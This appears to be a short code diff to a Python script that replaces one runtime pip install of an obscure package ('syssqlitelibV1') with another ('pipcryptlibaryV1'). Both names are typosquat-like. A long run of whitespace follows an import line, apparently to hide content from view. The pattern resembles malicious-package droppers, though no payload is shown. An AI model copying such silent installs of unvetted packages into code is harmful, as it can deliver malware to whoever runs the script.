@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitelibV1")
-import syssqlitelibV1
+os.system("pip install pipcryptlibaryV1")
+import pipcryptlibaryV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
